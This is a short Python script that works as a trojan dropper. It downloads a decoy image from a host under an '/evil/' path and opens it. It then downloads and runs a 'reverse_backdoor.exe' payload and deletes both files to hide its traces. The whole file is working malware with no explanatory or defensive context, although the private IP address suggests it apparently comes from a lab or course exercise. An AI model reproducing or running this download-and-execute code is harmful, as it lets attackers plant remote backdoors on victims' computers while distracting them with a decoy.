#!/usr/bin/env python3

import requests
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    #print(get_response.content)

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.42.128/evil/descarregar.jfif")
subprocess.Popen("descarregar.jfif", shell=True)

download("http://192.168.42.128/evil/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("descarregar.jfif")
os.remove("reverse_backdoor.exe")